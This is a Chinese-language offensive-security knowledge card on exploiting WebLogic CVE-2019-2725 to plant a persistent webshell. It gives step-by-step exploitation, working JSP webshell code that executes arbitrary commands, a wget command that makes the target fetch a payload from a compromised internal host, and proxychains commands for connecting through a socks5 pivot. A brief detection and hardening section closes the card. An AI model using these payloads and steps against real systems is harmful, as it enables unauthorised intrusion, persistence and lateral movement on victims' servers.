---
id: web-java-component-weblogic-wls-wsat-jsp-upload-indirect-fetch
title: WebLogic CVE-2019-2725 只给命令回显时，借已控内网主机反向拉取 JSP 落盘（wget 到 bea_wls_internal 目录）
type: scenario
domain: web
path: web/java/component/weblogic
technique: weblogic-wsat-rce-indirect-file-fetch
aliases:
- CVE-2019-2725 getshell
- wls-wsat 上传 JSP
- bea_wls_internal 落盘
- 借中转主机反向拉马
- Weblogic 只回显命令
tags:
- weblogic
- cve-2019-2725
- rce
- jsp
- webshell
- pivot
- java
- middleware
cve:
- CVE-2019-2725
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W3
  verified_at: '2026-11-08T13:24:09+08:00'
  notes: 已对照原文与图13/18核对：ladon64 t3scan 识别 172.22.0.20:7001 WebLogic 10.3.6.0、WeblogicScan 报 CVE-2019-2725、weblogic-CVE-2019-2725.py 命令回显可用但自带马走 GET 导致蚁剑连不上、最终由目标 wget 从 Tomcat 拉 ant.txt 落到 bea_wls_internal 下 war 目录，均与原文一致；卡内已把'EXP 不支持上传'改为'自带马只走 GET、管理端连不上'以贴合原文。affected_versions 已按'仅目标环境版本'清除。未验证点：未复跑 EXP/未访问该目录，无受影响区间原文标记。
---

## 一句话结论

WebLogic 10.3.6 的 `wls-wsat` 组件存在 CVE-2019-2725 反序列化 RCE，但公开 EXP 往往只给"执行一条命令并把输出带回"的能力，它写出的马也常只走 GET 参数、蚁剑这类要 POST 交互的管理端连不上；此时可以让 `bea_wls_internal` 下那个只接受 `pwd` + `cmd` 参数的最小 JSP 执行器用 `wget` 从另一台已被控制的内网主机（如 Tomcat）把完整 JSP 马拉到 Web 可访问目录，完成从"命令回显"到"可持续 WebShell"的落地。

## 原理

- CVE-2019-2725 的入口是 `wls-wsat` 的 `CoordinatorService`/`WorkContext` 反序列化端点（`/wls-wsat/CoordinatorPortType`），利用 XML 里的反序列化 gadget 在服务端执行任意命令，回显通过 `Runtime.exec` 的 stdout 拼进响应。
- 公开 EXP 的形态通常是"传一个命令、拿回命令输出"，它写出的小马也常只走 GET 参数，蚁剑/冰蝎这类需要 POST 交互的管理端连不上，等于拿不到可持续 WebShell。因此不能指望 EXP 直接落地可管理的马，需要"先能执行命令，再让命令去取文件"。
- WebLogic 的 Web 根里 `bea_wls_internal` 是一个默认部署的内部应用目录（`servers/AdminServer/tmp/_WL_internal/bea_wls_internal/<随机>/war/`），静态 JSP 放在该目录下即由容器编译执行，是常见的落地位置；该目录在被打补丁前通常可写。
- "借中转主机"的思路：目标 WebLogic 常常位于内网、与外网不直接通，但和同一网段里已被控制的机器（本例的 Tomcat）互通；于是让 WebLogic 上的命令 `wget http://<已控主机>:<port>/<payload>.txt -O <web根>/bea_wls_internal/shell.jsp` 主动去拉 —— 方向是"目标拉"而不是"攻击者推"，可以穿过只允许目标出站的边界。
- 第一阶段写进去的最小 JSP 只要"参数校验 + 执行命令"，作用是把"一次性命令回显"变成"可反复调用的执行点"；第二阶段再由它把真正的 WebShell（冰蝎/蚁剑可连的马）拉到同一目录，从而脱离 EXP 的脆弱性与一次性限制。
- 依赖前提：`wls-wsat` 未打补丁、WebLogic 进程对 `bea_wls_internal` 目录可写、目标能访问中转主机的 HTTP 端口。

## 触发条件

- 目标 WebLogic 版本/补丁状态落在受影响区间（本例 10.3.6.0），`/wls-wsat/CoordinatorPortType` 可达。
- 公开 EXP 可用（能执行任意命令并回显），但其自带的传马只走 GET、无法被蚁剑等管理端接管。
- WebLogic 所在网段内有另一台已被控制的主机（提供 HTTP 服务可托管 payload 文件）。
- WebLogic 进程对 `bea_wls_internal` 的 war 目录有写权限。
- 知晓该目录的随机子路径（可用 `find / -name bea_wls_internal -type d` 或读 `config.xml` 定位）。

## 利用步骤

1. 用扫描器/指纹确认 WebLogic 版本与 `wls-wsat` 存在（`/wls-wsat/CoordinatorPortType` 返回 200/500 而非 404）。
2. 用公开 EXP 执行一条无害命令（如 `whoami`）验证 RCE 与回显；确认它回显可用，但自带的传马（GET 参数型）无法被管理端接管。
3. 在已控主机（Tomcat）的 Web 目录放置两个文件：`ant.txt`（只含"参数校验 + 执行命令"的最小 JSP）与后续要落地的完整马文件。
4. 用 EXP 执行 `find / -name bea_wls_internal -type d 2>/dev/null` 定位真实目录，拼出其下 `war/` 路径。
5. 用 EXP 在目标上执行 wget：`wget http://<tomcat>:8080/<app>/ant.txt -O <bea_wls_internal>/war/ant.jsp`，让 WebLogic 主动从内网已控主机拉取文件。
6. 访问 `http://<weblogic>:7001/bea_wls_internal/ant.jsp?pwd=<pwd>&cmd=id` 验证执行点可用。
7. 再通过该执行点把完整 WebShell 拉到同目录，或用它直接执行后续命令；代理配置好 Socks5 后即可用蚁剑等工具连该 JSP，完成可持续控制。

## PoC

```jsp
<%-- 第一阶段：最小执行器，参数 pwd 做校验、cmd 执行命令 --%>
<%@ page language="java" contentType="text/html; charset=GBK" pageEncoding="UTF-8"%>
<%
  if ("<pwd>".equals(request.getParameter("pwd"))) {
      java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
      int len = -1; byte[] b = new byte[4092];
      out.print("<pre>");
      while ((len = in.read(b)) != -1) { out.println(new String(b, "GBK")); }
      out.print("</pre>");
  }
%>
```

```text
# 1) 定位落盘目录（用 EXP 命令回显）
/wls-wsat/CoordinatorPortType  ->  cmd: find / -name bea_wls_internal -type d

# 2) 目标主动拉取第一阶段 JSP（<tomcat> 为已控内网主机）
cmd: wget http://<tomcat>:8080/<app>/ant.txt -O <bea_wls_internal>/9j4dqk/war/ant.jsp

# 3) 验证执行点
GET http://<weblogic>:7001/bea_wls_internal/ant.jsp?pwd=<pwd>&cmd=whoami
```

```bash
# 4) 挂代理后连接（示意）
# 蚁剑：代理设置 -> 手动 -> socks5 -> <frps 所在主机>:<remote_port>
# 或 curl 通过 proxychains 访问
proxychains curl 'http://<weblogic>:7001/bea_wls_internal/ant.jsp?pwd=<pwd>&cmd=id'
```

## 变体与关联

- 变体：如果 EXP 连命令回显都不完整，可改用 `wls-wsat` 的 `WorkContext` 直接构造 `ProcessBuilder` 调用来落地文件；或改用 WebLogic 其他反序列化入口（T3/IIOP，见关联卡）。
- 变体：中转方向反过来也能用 —— 已控主机 `curl -T`/PUT 上传到目标可达的 HTTP 服务，或用 SMB/共享目录；核心是"目标与中转主机网络互通"。
- 变体：落盘位置除 `bea_wls_internal` 外，还可用 `servers/AdminServer/tmp/_WL_internal/`、`config/deployments` 或应用自身可写的上传目录。
- 关联：[[web-java-component-weblogic-cve-2020-2551-iiop-echo-rce]]（另一条 WebLogic 反序列化回显链）；[[web-java-component-tomcat-manager-basic-weak-auth-war-deploy]]（同场景里作为"中转/托管 payload"的另一台主机入口）。
- 边界：打了 2019 年 4 月补丁后 `wls-wsat` 端点被移除；`bea_wls_internal` 目录不可写或容器只读文件系统；目标无法访问中转主机的 HTTP 端口（单向 ACL）。

## 检测与防御

- 检测：`/wls-wsat/CoordinatorPortType`、`/bea_wls_internal/*.jsp` 的异常访问；WebLogic 进程派生出 `wget`/`curl`/`sh` 等子进程；`bea_wls_internal` 目录下出现新的 JSP 文件（文件完整性监控）。
- 检测：WebLogic 出站 HTTP 请求指向内网主机的非业务端口（拉取 `.txt`/`.jsp`）；随后对同一 JSP 的高频 `?pwd=&cmd=` 访问。
- 修复：打 Oracle 2019 年 4 月及后续 CPU 补丁（移除 `wls-wsat`）；删除/禁用 `bea_wls_internal` 等默认内部应用；对 `AdminServer` 目录做写保护。
- 加固：WebLogic 以最小权限账户运行、Web 根只读；内网禁止服务器随意出站；用 WAF/IDS 检测反序列化特征与 `wls-wsat` 路径。

## 备注

原文目标为 WebLogic 10.3.6.0、经 `WeblogicScan.py` 发现 CVE-2019-2725，`weblogic-CVE-2019-2725.py` 只支持 GET 命令回显所以蚁剑连不上，最终用 Webshell 自身 `wget` 从网段内 Tomcat 拉 `ant.txt` 落盘到 `bea_wls_internal` 下。10.3.6.0 仅是目标环境版本，原文未给受影响区间，故 affected_versions 已清除；cve 取原文明确点名的 CVE-2019-2725。
